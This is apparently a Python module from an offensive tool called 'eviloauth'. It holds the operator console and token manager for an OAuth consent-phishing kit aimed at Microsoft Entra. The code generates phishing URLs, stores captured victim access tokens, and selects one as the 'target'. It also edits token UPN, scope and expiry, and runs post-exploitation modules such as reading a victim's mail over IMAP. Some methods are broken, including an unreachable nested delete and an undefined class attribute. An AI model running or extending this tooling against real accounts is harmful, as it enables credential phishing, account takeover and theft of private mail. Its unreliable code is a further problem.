import sys
import logging
from diskcache import Cache
from eviloauth.idp import IDP
from eviloauth.exceptions import EviloauthCommandException
from eviloauth.access_token import AccessToken
from eviloauth import app, cache, temp_dir, load_modules
from datetime import datetime, timedelta

class TokenManager:
    def __init__(self, cache_dir, general_cache):
        self.cache = Cache(cache_dir)
        self.general_cache = general_cache

    def list_tokens(self):
        # Get the 'tokens' from the main cache
        general_tokens = self.general_cache.get('tokens', {})
        return list(general_tokens.keys())
    
    def add(self, access_token):
        if isinstance(access_token, AccessToken):
            token_key = str(access_token)
            self.cache.set(token_key, access_token)
            logging.info(f"Token added with key: {token_key}")
            # Debug: Print all current keys in the cache
            logging.debug(f"Current keys in cache: {list(self.cache.keys())}")
            return token_key
            
        def delete(self, token_key):
            if token_key in self.cache:
                self.cache.delete(token_key)
                return True
            return False

    def list(self):
        return [key for key in self.cache.keys()]

    def update_upn(self, token_key, new_upn):
        # Retrieve the token from the general cache
        general_tokens = self.general_cache.get('tokens', {})
        token = general_tokens.get(token_key)

        if token:
            # Update the UPN for both JWT and OAT tokens
            token.set_upn(new_upn)
            general_tokens[token_key] = token  # Update the token in the general cache

            # Update the general cache with the modified token
            self.general_cache.set('tokens', general_tokens)

            logging.info(f"UPN updated for token {token_key}.")
            return True
        else:
            logging.error("Token not found.")
            return False

    def update_scope(self, token_key, new_scope):
        # Retrieve the token from the general cache
        general_tokens = self.general_cache.get('tokens', {})
        token = general_tokens.get(token_key)

        if token:
            # Update the scope for both JWT and OAT tokens
            token.set_scope(new_scope)
            general_tokens[token_key] = token  # Update the token in the general cache

            # Update the general cache with the modified token
            self.general_cache.set('tokens', general_tokens)

            logging.info(f"Scope updated for token {token_key}.")
            return True
        else:
            logging.error("Token not found.")
            return False

    def update_expiry(self, token_key, time_str):
        # Retrieve the token from the general cache
        general_tokens = self.general_cache.get('tokens', {})
        token = general_tokens.get(token_key)

        if token:
            try:
                hours = int(time_str[:2])
                minutes = int(time_str[2:])
                new_expiry = datetime.utcnow() + timedelta(hours=hours, minutes=minutes)
                
                # Update the expiry for both JWT and OAT tokens
                token.set_expiry(new_expiry)
                general_tokens[token_key] = token  # Update the token in the general cache

                # Update the general cache with the modified token
                self.general_cache.set('tokens', general_tokens)

                logging.info(f"Expiry updated to {new_expiry} for token {token_key}.")
                return True
            except (ValueError, IndexError):
                logging.error("Invalid time format. Please enter time as HHMM.")
                return False
        else:
            logging.error("Token not found.")
            return False
        
class Dispatcher:
    def __init__(self, flask_server, module_dict, redirect_server, cache):
        self.flask_server = flask_server
        self.module_dict = module_dict
        self.redirect_server = redirect_server
        self.cache = cache
        self.token_manager = TokenManager(temp_dir, cache) 
        
    @classmethod
    def get_token_manager(cls):
        if cls.instance:
            return cls.instance.token_manager
        else:
            return None

    def dispatch(self, commands):
        cmd_parts = commands.split(' ')
        cmd = cmd_parts[0]
        cmd_args = cmd_parts[1:]

        if cmd == 'exit':
            self.dispatch_exit()
        elif cmd == 'module' and len(cmd_args) >= 2:
            self.dispatch_module(cmd_args[0], cmd_args[1], cmd_args[2:])
        elif cmd == 'tokens':
            self.dispatch_tokens(cmd_args)  # Handles all token-related commands
        elif cmd == 'idp':
            self.dispatch_idp(cmd_args)  # Handles IDP related commands
        elif cmd == 'target':
            self.dispatch_target(cmd_args)  # Handles target-related commands
        elif cmd == 'url':
            self.dispatch_url()  # Displays the phishing URL
        elif cmd == 'help':
            self.dispatch_help(cmd_args)  # Displays help information
        else:
            raise EviloauthCommandException(f'Unknown command {cmd}')

    def dispatch_exit(self):
        print('Exiting...')
        self.flask_server.shutdown()
        sys.exit()

    def dispatch_module(self, module_name, sub_module_name, module_args):
        full_module_name = f'eviloauth.module.{module_name}.{sub_module_name}'

        if full_module_name in self.module_dict:
            mod = self.module_dict[full_module_name]

            # Retrieve the target access token from the cache
            target_access_token = cache.get('target')

            # Ensure module_args contains the necessary information
            if not module_args:
                module_args = [target_access_token, 0]  # Default values for 'i' and 'target_access_token'
            elif len(module_args) == 1:
                module_args.append(0)  # Default value for 'i' if not provided

            mod.__run__(*module_args)  # Pass the target_access_token and 'i' to the module
        else:
            logging.error(f'Module {full_module_name} not found')

    def dispatch_idp(self, cmd_args):
        if len(cmd_args) >= 1:
            sub = cmd_args[0]
            arg = cmd_args[1] if len(cmd_args) > 1 else None

            if sub == 'list':
                print('Current IDP: %s' % self.cache.get('idp'))
            elif sub == 'configure' and arg:
                # Initialize the IDP instance with the provided argument
                idp = IDP(arg, self.redirect_server)
                # Store the IDP instance in the dispatcher's cache
                self.cache.set('idp', idp)
                # Retrieve and display the phishing URL
                self.phishing_url = idp.get_phishing_url()
                print(f"Phishing URL set: {self.phishing_url}")
            else:
                raise EviloauthCommandException(f'Unknown idp command: {sub}')
        else:
            logging.error("Invalid arguments for idp command")

    def dispatch_tokens(self, cmd_args):
        logging.info(f"cmd_args: {cmd_args}")  # For debugging

        if len(cmd_args) >= 1:
            subcmd = cmd_args[0]

            if subcmd == 'list':
                # Call handle_tokens_list whether a specific key is provided or not
                self.handle_tokens_list(cmd_args)

            elif subcmd == 'set' and len(cmd_args) >= 4:
                self.handle_tokens_set(cmd_args)

            elif subcmd == 'delete' and len(cmd_args) == 2:
                self.handle_tokens_delete(cmd_args)

            elif subcmd == 'add':
                logging.error('Adding tokens not implemented yet')

            else:
                raise EviloauthCommandException(f'Unknown subcommand {subcmd}')

    def handle_tokens_list(self, cmd_args):
        if len(cmd_args) > 1:
            token_key = cmd_args[1].strip("'")
            general_tokens = self.token_manager.cache.get('tokens', {})

            if token_key in general_tokens:
                token_obj = general_tokens[token_key]
                if token_obj:
                    token_details = token_obj.get_token_details()

                    print(f"Details for token {token_key}:")
                    for detail, value in token_details.items():
                        print(f"  {detail.capitalize()}: {value}")
                else:
                    print(f"No token found for key: {token_key}")
            else:
                print(f"No token found for key: {token_key}")
        else:
            # Initialize general_tokens at the beginning of the else clause
            general_tokens = self.token_manager.cache.get('tokens', {})
            print("Available token keys:", list(general_tokens.keys()))

    def handle_tokens_set(self, cmd_args):
        if len(cmd_args) >= 4 and cmd_args[0] == 'set':
            token_key = cmd_args[1]
            action = cmd_args[2]
            value = ' '.join(cmd_args[3:])

            if action == 'upn':
                if self.token_manager.update_upn(token_key, value):
                    print(f"UPN updated successfully for {token_key}")
                else:
                    logging.error(f"Failed to update UPN for {token_key}")
            elif action == 'expiry':
                value_str = str(value)  # Convert to string to ensure it's in the correct format
                if self.token_manager.update_expiry(token_key, value_str):
                    logging.info(f"Expiry updated successfully for {token_key}")
                else:
                    logging.error(f"Failed to update expiry for {token_key}")
            elif action == 'scope':
                if self.token_manager.update_scope(token_key, value):
                    logging.info(f"Scope updated successfully for {token_key}")
                else:
                    logging.error(f"Failed to update scope for {token_key}")
            else:
                logging.error("Invalid format for 'set' subcommand.")
        else:
            logging.error("Invalid format for 'set' subcommand.")

    def handle_tokens_delete(self, cmd_args):
        if len(cmd_args) == 2 and cmd_args[0] == 'delete':
            token_key = cmd_args[1]
            if self.token_manager.delete(token_key):
                print(f"Token {token_key} deleted successfully.")
            else:
                print(f"Token {token_key} not found or could not be deleted.")

    def dispatch_configure(self, cmd_args):
        if len(cmd_args) >= 2:
            # Extract subcommand and its argument
            sub = cmd_args[0]
            arg = cmd_args[1]

            # Implement the logic for different subcommands
            if sub == 'idp':
                # Check if the argument is one of the supported IDPs
                if arg in ['entra_implicit_flow', 'entra_code_flow']:
                    # Initialize and configure the IDP
                    idp = IDP(arg, self.redirect_server)
                    # Set the IDP in the cache
                    self.cache.set('idp', idp)
                    # Retrieve and display the phishing URL
                    self.phishing_url = idp.get_phishing_url()
                    print(f"Phishing URL set: {self.phishing_url}")
                else:
                    logging.error(f"IDP {arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
        else:
            logging.error("Invalid arguments for configure command")

    def handle_target_set(self, token_key):
        # Logic to set the target
        if token_key in self.token_manager.cache:
            cache.set('target', self.token_manager.cache.get(token_key))
            logging.info(f"Target set to {token_key}")
        else:
            logging.error(f"Token {token_key} not found")

    def handle_target_list(self):
        # Logic to list the current target
        current_target = cache.get('target')
        if current_target:
            print(f"Current Target:\n{current_target}")
        else:
            print(f"No targets set.\nTo set a target use the following command: target set <token name>")

    def dispatch_target(self, cmd_args):
        # Check if cmd_args has at least 1 element: subcommand
        if len(cmd_args) >= 1:
            sub = cmd_args[0]

            # Implement the logic for different subcommands
            if sub == 'set':
                if len(cmd_args) >= 2:
                    token_key = cmd_args[1]
                    self.handle_target_set(token_key)
                else:
                    logging.error("No token key provided for target set")
            elif sub == 'list':
                self.handle_target_list()
            else:
                raise EviloauthCommandException(f'Unknown target command: {sub}')
        else:
            logging.error("Invalid arguments for target command")

    def dispatch_url(self):
        if self.phishing_url:
            print(f"Phishing URL:\n{self.phishing_url}")
        else:
            print("Phishing URL not set. Please run 'configure idp' first.")

    def dispatch_help(self, cmd_args):
        if not cmd_args or len(cmd_args) == 0:
            self.display_general_help()
        elif cmd_args[0] == 'modules':
            self.display_modules_help()
        elif cmd_args[0] == 'tokens':
            self.display_tokens_help()
        elif cmd_args[0] == 'configure':
            self.display_configure_help()
        elif cmd_args[0] == 'url':
            self.display_url_help()
        else:
            print(f"No specific help available for '{cmd_args[0]}'")

    def display_general_help(self):
        help_text = """
        EvilOAuth General Help:

        Commands:
        - exit: Exits the application.
        - modules: Manages different modules.
        - tokens: Manages tokens.
        - configure: Configures the Identity Provider.
        - url: Displays the phishing URL.
        - help: Displays help information.

        For detailed help on specific commands, type 'help <command>'.
        """
        print(help_text)

    def display_modules_help(self):
        help_text = """
        Modules Command Help:

        Usage: modules <module_name> <sub_module_name> <sub_module_action>

        - Runs a specified module.
        - Example: modules read_mail imap read
        """
        print(help_text)

    def display_tokens_help(self):
        help_text = """
        Tokens Command Help:

        Usage: tokens <subcommand> [<args>]

        Subcommands:
        - list [<token_key>]: Lists all tokens or details of a specific token.
        - set <token_key> <attribute> <value>: Updates attributes of a token.
        - delete <token_key>: Deletes a specified token.

        Attributes for 'set' subcommand:
        - upn: Updates the User Principal Name.
        - scope: Updates the scope.
        - expiry: Updates the expiry time in HHMM format.

        Example: tokens set OAT-example upn new-upn@example.com
        """
        print(help_text)

    def display_configure_help(self):
        help_text = """
        Configure Command Help:

        Usage: configure idp <idp_name>

        - Configures the Identity Provider.
        - Supported IDPs: entra_implicit_flow, entra_code_flow
        - Example: configure idp entra_implicit_flow
        """
        print(help_text)

    def display_url_help(self):
        help_text = """
        URL Command Help:

        Usage: url

        - Displays the phishing URL if set.
        - Requires running 'configure idp' command first.
        """
        print(help_text)